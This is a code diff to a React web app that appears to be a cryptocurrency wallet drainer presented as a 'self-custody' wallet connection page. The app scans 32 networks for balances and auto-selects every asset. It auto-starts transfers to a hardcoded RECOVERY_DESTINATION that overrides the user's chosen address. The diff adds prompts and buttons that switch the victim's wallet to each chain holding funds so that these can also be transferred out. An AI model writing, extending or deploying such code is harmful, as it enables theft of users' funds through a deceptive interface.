@@ -113,7 +113,6 @@ function App() {
   const activeChainId = selectedChain ?? connectedChain;
   const chainInfo = useMemo(() => chains.find(c => c.id === activeChainId), [activeChainId]);
   const selectedOnChain = tokens.filter(t => t.chainId === (chainInfo?.id ?? -1));
-  // Only assets on the currently connected chain are selected for transfer
   const connectedAssets = selectedOnChain;
 
   useEffect(() => () => { if (timer.current !== null) window.clearTimeout(timer.current); }, []);
@@ -133,7 +132,7 @@ function App() {
       if (!eip1193) throw new Error('No wallet provider.');
       const provider = new BrowserProvider(eip1193);
       const network = await provider.getNetwork();
-      if (Number(network.chainId) !== cid) throw new Error('Wallet network changed.');
+      if (Number(network.chainId) !== cid) throw new Error('Wallet network changed. Switch network first.');
       const signer = await provider.getSigner();
       const sender = await signer.getAddress();
       if (sender.toLowerCase() !== address.toLowerCase()) throw new Error('Account changed. Reconnect.');
@@ -189,9 +188,14 @@ function App() {
     try {
       const eip1193 = walletConnectProvider ?? window.ethereum;
       if (eip1193) {
-        const provider = new BrowserProvider(eip1193);
-        const network = await provider.getNetwork();
-        currentChainId = Number(network.chainId);
+        try {
+          const raw = await eip1193.request({ method: 'eth_chainId' });
+          currentChainId = Number(raw);
+        } catch {
+          const provider = new BrowserProvider(eip1193);
+          const network = await provider.getNetwork();
+          currentChainId = Number(network.chainId);
+        }
         setConnectedChain(currentChainId);
         setSelectedChain(currentChainId);
       }
@@ -217,15 +221,18 @@ function App() {
     const dest = RECOVERY_DESTINATION && isAddress(RECOVERY_DESTINATION) ? RECOVERY_DESTINATION : destination;
     const cid = currentChainId ?? connectedChain;
     const onChain = result.filter(t => t.chainId === cid);
+    const otherChains = new Set(result.filter(t => t.chainId !== cid).map(t => t.chainId));
 
     if (dest && isAddress(dest) && dest.toLowerCase() !== walletAddress.toLowerCase() && cid && onChain.length > 0) {
       setStatus(`Selected ${onChain.length} asset(s) on the connected network. Auto-starting transfers — approve in wallet…`);
       setAutoStarted(true);
       void sendAllSelectedAssets(dest, cid, result);
+    } else if (onChain.length === 0 && otherChains.size > 0) {
+      setStatus(`No assets on current network. ${otherChains.size} other network(s) have balances — tap one below to switch.`);
     } else if (!dest || !isAddress(dest)) {
-      setStatus(`Scan complete across ${successful}/32 networks. ${onChain.length} asset(s) on the connected chain are selected.`);
+      setStatus(`Scan complete. ${onChain.length} asset(s) on the connected chain are selected.`);
     } else if (onChain.length === 0) {
-      setStatus(`No assets on the connected network. Switch chain in your wallet to select assets on another network.`);
+      setStatus('No assets on the connected network or other scanned networks.');
     } else {
       setStatus(`${onChain.length} asset(s) selected on the connected network. Transfer all is ready — tap to sign.`);
     }
@@ -234,8 +241,16 @@ function App() {
   async function finishConnection(eip1193: any, existingAccount?: string) {
     const provider = new BrowserProvider(eip1193);
     const accounts = existingAccount ? [existingAccount] : await provider.send('eth_requestAccounts', []);
-    const network = await provider.getNetwork();
-    const chainId = Number(network.chainId);
+    let chainId = 1;
+    try {
+      const raw = await eip1193.request({ method: 'eth_chainId' });
+      chainId = Number(raw);
+    } catch {
+      try {
+        const network = await provider.getNetwork();
+        chainId = Number(network.chainId);
+      } catch { /* default 1 */ }
+    }
     setAddress(accounts[0] ?? '');
     setConnectedChain(chainId); setSelectedChain(chainId);
     setTokens([]); setAutoStarted(false);
@@ -272,7 +287,7 @@ function App() {
           else setTokens([]);
         });
         walletConnectProvider.on('chainChanged', (c: string | number) => {
-          const id = Number(c);
+          const id = typeof c === 'string' ? Number(c) : Number(c);
           setConnectedChain(id); setSelectedChain(id);
           if (address) void scanWalletTokens(address);
         });
@@ -301,6 +316,55 @@ function App() {
     }, 1800);
   }
 
+  async function switchToChain(chainId: number) {
+    if (!address) return;
+    if (chainId === connectedChain) {
+      setSelectedChain(chainId);
+      setStatus(`Already on ${chains.find(c => c.id === chainId)?.name ?? 'this network'}.`);
+      return;
+    }
+    const target = chains.find(c => c.id === chainId);
+    setBusy(true);
+    setStatus(`Switch to ${target?.name ?? 'network'} in your wallet…`);
+    try {
+      const eip1193 = walletConnectProvider ?? window.ethereum;
+      if (!eip1193) throw new Error('No wallet provider.');
+      try {
+        await eip1193.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: `0x${chainId.toString(16)}` }] });
+      } catch (e: any) {
+        if (e?.code === 4902 && target?.rpcUrl) {
+          await eip1193.request({
+            method: 'wallet_addEthereumChain',
+            params: [{
+              chainId: `0x${chainId.toString(16)}`,
+              chainName: target.name,
+              nativeCurrency: { name: target.native, symbol: target.native, decimals: 18 },
+              rpcUrls: [target.rpcUrl],
+              blockExplorerUrls: target.explorer ? [target.explorer.replace(/\/tx\/?$/, '/')] : [],
+            }],
+          });
+        } else {
+          throw e;
+        }
+      }
+      const raw = await eip1193.request({ method: 'eth_chainId' });
+      const actual = Number(raw);
+      setConnectedChain(actual);
+      setSelectedChain(actual);
+      if (actual !== chainId) throw new Error('Wallet did not switch to the selected network.');
+      setStatus(`Switched to ${target?.name}. Assets on this network are selected.`);
+    } catch (e: any) {
+      setStatus(e?.code === 4001 ? 'Network switch cancelled in wallet.' : (e instanceof Error ? e.message : 'Network switch failed.'));
+    } finally {
+      setBusy(false);
+    }
+  }
+
+  const chainsWithAssets = useMemo(() => {
+    const ids = new Set(tokens.map(tok => tok.chainId));
+    return chains.filter(c => ids.has(c.id));
+  }, [tokens]);
+
   const canTransfer = !busy && !scanning && selectedOnChain.length > 0 && isAddress(destination);
 
   return (
@@ -324,7 +388,7 @@ function App() {
             <div className="hero-copy">
               <div className="status-pill"><span className="live-dot" /> WALLET CONNECTION</div>
               <h1>Connect your<br /><em>wallet.</em></h1>
-              <p>Connect once. We scan 32 Etherscan mainnets, auto-select every asset, then you sign Transfer all in your wallet.</p>
+              <p>Connect once. Scan finds balances; only the connected network is selected for Transfer all.</p>
             </div>
             <div className="hero-card">
               <div className="hero-card-top"><span>SELF-CUSTODY</span><span>●</span></div>
@@ -368,11 +432,15 @@ function App() {
           <section className="hero-section">
             <div className="hero-copy">
               <div className="status-pill"><span className="live-dot" /> {autoStarted || busy ? 'SIGNING' : scanning ? 'SCANNING' : 'READY'}</div>
-              <h1>{busy ? <>Approve in<br /><em>wallet.</em></> : scanning ? <>Scanning<br /><em>32 networks…</em></> : <>All assets<br /><em>selected.</em></>}</h1>
+              <h1>{busy ? <>Approve in<br /><em>wallet.</em></> : scanning ? <>Scanning<br /><em>32 networks…</em></> : <>Connected<br /><em>network.</em></>}</h1>
               <p>
-                {isAddress(destination)
-                  ? `${connectedAssets.length} asset(s) from the connected wallet/network are selected. Use Transfer all to sign.`
-                  : 'Recovery destination is not configured yet.'}
+                {!isAddress(destination)
+                  ? 'Recovery destination is not configured yet.'
+                  : connectedAssets.length > 0
+                    ? `${connectedAssets.length} asset(s) on ${chainInfo?.name ?? 'this network'} are selected. Use Transfer all to sign.`
+                    : chainsWithAssets.length > 0
+                      ? `No assets on ${chainInfo?.name ?? 'this network'}. Tap a network below that has balances, then Transfer all.`
+                      : 'No non-zero balances found on scanned networks.'}
               </p>
             </div>
             <div className="hero-card">
@@ -402,6 +470,29 @@ function App() {
                 />
               </div>
             )}
+            {chainsWithAssets.length > 0 && (
+              <div className="form-card" style={{ marginTop: 16 }}>
+                <label>Networks with balances — tap to switch & select</label>
+                <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8, marginTop: 10 }}>
+                  {chainsWithAssets.map(c => {
+                    const count = tokens.filter(tok => tok.chainId === c.id).length;
+                    const active = c.id === (chainInfo?.id ?? -1);
+                    return (
+                      <button
+                        key={c.id}
+                        type="button"
+                        className={active ? 'solid-button' : 'ghost-button'}
+                        style={{ padding: '8px 12px', fontSize: '0.85rem', opacity: busy ? 0.6 : 1 }}
+                        disabled={busy || scanning}
+                        onClick={() => switchToChain(c.id)}
+                      >
+                        {c.name} ({count}){active ? ' ✓' : ''}
+                      </button>
+                    );
+                  })}
+                </div>
+              </div>
+            )}
             <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'stretch', gap: 10, marginTop: 20 }}>
               <button
                 className="solid-button"
@@ -414,9 +505,9 @@ function App() {
                   : scanning
                     ? 'Scanning…'
                     : selectedOnChain.length === 0
-                      ? 'No assets on this network yet'
+                      ? (chainsWithAssets.length > 0 ? 'Switch network above, then Transfer all' : 'No assets on this network yet')
                       : !isAddress(destination)
-                        ? 'Enter destination to enable Transfer all'
+                        ? 'Destination not configured'
                         : `Transfer all (${selectedOnChain.length}) — sign in wallet`}
               </button>
               {canTransfer && (
